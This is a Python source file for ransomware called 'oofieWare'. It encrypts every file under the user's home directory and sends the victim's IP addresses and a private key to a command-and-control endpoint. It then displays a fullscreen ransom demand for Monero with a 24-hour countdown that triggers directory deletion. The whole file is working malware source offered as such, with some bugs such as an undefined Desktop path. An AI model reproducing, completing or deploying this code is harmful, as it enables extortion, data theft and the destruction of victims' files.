import os
import subprocess
import shutil
import threading
import socket
import base64
import json
import requests
import tkinter as tk
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class oofieWare:
    def __init__(self, gen_rsa=True):
        self.key = None
        self.enc_key = None
        self.encrypter = None
        self.decrypter = None
        self.started = False
        self.startPoint = os.path.expanduser("~")
        # self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
        self.LARGE_SIZE = 50_000_000
        self.PUBLIC_IP = requests.get('https://api.ipify.org').text
        self.PRIVATE_IP = socket.gethostbyname(socket.gethostname())
        
        self.ENDPOINT = "<command and control server>"

        if gen_rsa:
            self.privKey = None
            self.pubKey = None
        else:
            self.pubKey = '' # insert default val

    def startPt(self):
        return self.startPoint

    def gen_sym_key(self):
        secure_pw = os.urandom(32)
        salt = os.urandom(16)

        kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
             salt=salt,
             iterations=500000,
        )

        self.key = base64.urlsafe_b64encode(kdf.derive(secure_pw))
        self.encrypter = Fernet(self.key)

    def gen_rsa_keypair(self):
        keyPair = RSA.generate(4096)
        self.privKey = keyPair.export_key()
        self.pubKey = keyPair.publickey()
        requests.post(self.ENDPOINT, data=json.dumps({
            "PUBLIC_IP": self.PUBLIC_IP,
            "PRIVATE_IP": self.PRIVATE_IP,
            "PRIVATE_KEY": self.privKey
        }), headers={"Content-Type" : "application/json"})
        self.privKey = None

    def crypt_file(self, file_path):
        if self.encrypter:
            with open(file_path, 'rb') as x:
                data = x.read()
                enc_data = self.encrypter.encrypt(data)
                x.close()

            with open(file_path, "wb") as y:
                y.write(enc_data)
                y.close()

        if self.decrypter:
            with open(file_path, 'rb') as x:
                data = x.read()
                dec_data = self.decrypter.decrypt(data)
                x.close()

            with open(file_path, "wb") as y:
                y.write(dec_data)
                y.close()

    def crypt_system(self):
        for root, dirs, files in os.walk(self.startPoint, topdown = True):
            for file in files:
                file_path = os.path.join(root, file)
                if not (os.stat(file_path).st_size > self.LARGE_SIZE):
                    self.crypt_file(file_path)
                else:
                    threading.Thread(target=self.crypt_file, args=(file_path)).start()
        self.encrypter = None

    def enc_key(self):
        enc_for_key = PKCS1_OAEP.new(self.pubKey)
        self.enc_key = enc_for_key.encrypt(self.key)
        self.key = None

    def show_ransom_window(self):

        SKULL = r'''
                         uuuuuuu
                     uu$$$$$$$$$$$uu
                  uu$$$$$$$$$$$$$$$$$uu
                 u$$$$$$$$$$$$$$$$$$$$$u
                u$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$"   "$$$"   "$$$$$$u
               "$$$$"      u$u       $$$$"
                $$$u       u$u       u$$$
                $$$u      u$$$u      u$$$
                 "$$$$uu$$$   $$$uu$$$$"
                  "$$$$$$$"   "$$$$$$$"
                    u$$$$$$$u$$$$$$$u
                     u$"$"$"$"$"$"$u
          uuu        $$u$ $ $ $ $u$$       uuu
         u$$$$        $$$$$u$u$u$$$       u$$$$
          $$$$$uu      "$$$$$$$$$"     uu$$$$$$
        u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
        $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
         """      ""$$$$$$$$$$$uu ""$"""
                uuuu ""$$$$$$$$$$uuu
        u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
        $$$$$$$$$$""""           ""$$$$$$$$$$$"
        "$$$$$"                      ""$$$$""
            $$$"                         $$$$"
        '''


        DESCRIPTION = '''Your files have been encrypted with a military-grade encryption algorithm. You will not be able to access them,
        and NO ONE will be able to help you decrypt your files except for us.

        TO DECRYPT YOUR FILES:

        1. Pay $200 in MONERO to this address: o845v9o3cn4o38cvo7tvcno8t7v94nvc7t9848947c
        2. Email the file called "EMAIL_ME.pem" WHICH IS ON YOUR DESKTOP to astralcybergroup@astralcybergroup.com, along with screenshot of payment.

        If we can confirm that you paid, WE WILL SEND YOU THE KEY TO UNLOCK ALL YOUR FILES.

        IF YOU TRY TO PLAY ANY GAMES, OR IF YOU DON'T PAY WITHIN 24 HOURS,

        WE WILL THROW AWAY THE KEY. WE WILL DELETE ALL YOUR FILES. YOU WILL LOSE YOUR FILES FOREVER. 

        THE CLOCK IS TICKING'''

        window = tk.Tk()
        window.attributes('-fullscreen', True)

        def countdown(count):
            # change text in label
            # count = '01:30:00'
            hour, minute, second = count.split(':')

            hour = int(hour)
            minute = int(minute)
            second = int(second)

            if self.started:
                countdownLbl['text'] = '{}:{}:{}'.format(hour, minute, second)
            else:
                countdownLbl['text'] = '{}:{}:{}'.format(hour, minute, '00')
                self.started = True

            if second > 0 or minute > 0 or hour > 0:
                # call countdown again after 1000ms (1s)
                if second > 0:
                    second -= 1
                elif minute > 0:
                    minute -= 1
                    second = 59
                elif hour > 0:
                    hour -= 1
                    minute = 59
                    second = 59
                window.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

        logoFrame = tk.Frame(bg='#000000')
        frame1 = tk.Frame(bg="#000000")
        frame2 = tk.Frame(bg="#000000")
        countdownFrame = tk.Frame(bg="#000000")

        skullLbl = tk.Label(text=SKULL, fg="#ff0000", bg="#000000", font="TkFixedFont", justify=tk.LEFT, master=logoFrame)
        skullLbl.pack(pady=5)

        mainPara = tk.Label(text=DESCRIPTION, fg="#ff0000", bg="#000000", font=("Arial", 15), master=frame2)
        mainPara.pack(pady=10)

        countdownLbl = tk.Label(fg="#ff0000", bg="#ffffff", font=("Arial", 30), master=countdownFrame)
        countdownLbl.pack()

        logoFrame.pack(fill=tk.X)
        frame1.pack(fill=tk.X)
        frame2.pack(fill=tk.X)
        countdownFrame.pack(fill=tk.BOTH, expand=True)

        countdown("24:00:00")

        eraseTimer = threading.Timer(60*60*24, self.erase_system)

        eraseTimer.start()

        window.mainloop()

    def erase_system(self):
        for root, dirs, files in os.walk(self.Desktop, topdown = True):
            try:
                shutil.rmtree(os.path.join(root, dirs))
            except OSError as e:
                pass
            
    



# print(oofieWare().startPt())
